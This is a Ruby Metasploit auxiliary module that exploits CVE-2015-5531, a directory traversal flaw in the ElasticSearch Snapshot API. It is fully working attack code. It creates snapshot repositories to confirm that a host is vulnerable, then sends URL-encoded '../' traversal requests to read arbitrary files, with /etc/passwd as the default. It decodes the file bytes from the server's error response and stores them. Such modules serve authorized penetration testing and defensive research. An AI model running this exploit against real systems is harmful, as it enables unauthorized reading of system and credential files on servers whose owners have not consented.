##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
      'Description'    => %q{
        'This module exploits a directory traversal vulnerability in
        ElasticSearch, allowing an attacker to read arbitrary files
        with JVM process privileges, through the Snapshot API.'
      },
      'References'     =>
        [
          ['CVE', '2015-5531'],
          ['PACKETSTORM', '132721']
        ],
      'Author'         =>
        [
          'Benjamin Smith', # Vulnerability Discovery
          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(9200),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 7])
      ], self.class
    )

    deregister_options('RHOST')
  end

  def check_host(ip)
    res1 = send_request_raw(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
      'data'   => '{"type":"fs","settings":{"location":"dsr"}}'
    )

    res2 = send_request_raw(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
      'data'   => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
    )

    if res1.body.include?('true') && res2.body.include?('true')
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def read_file(file)
    travs = '_snapshot/pwn/ev1l%2f'

    payload = '../' * datastore['DEPTH']

    travs << payload.gsub('/', '%2f')
    travs << file.gsub('/', '%2f')

    vprint_status("Retrieving file contents...")

    res = send_request_raw(
      'method' => 'GET',
      'uri'    => travs
    )

    if res && res.code == 400
      return res.body
    else
      print_status("Server returned HTTP response code: #{res.code}")
      print_status(res.body)
      return nil
    end
  end

  def run_host(ip)
    vprint_status("Checking if it's a vulnerable ElasticSearch")

    check_code = check_host(ip)
    print_status("#{check_code.second}")
    if check_host(ip) != Exploit::CheckCode::Appears
      return
    end

    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ %r{/^\//}

    contents = read_file(filename)
    unless contents
      print_error("No file downloaded")
      return
    end

    begin
      data_hash = JSON.parse(contents)
    rescue JSON::ParserError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      return
    end

    fcontent = data_hash['error'].scan(/\d+/).drop(2).map(&:to_i).pack('c*')
    fname = datastore['FILEPATH']

    path = store_loot(
      'elasticsearch.traversal',
      'text/plain',
      ip,
      fcontent,
      fname
    )
    print_good("File saved in: #{path}")
  end
end
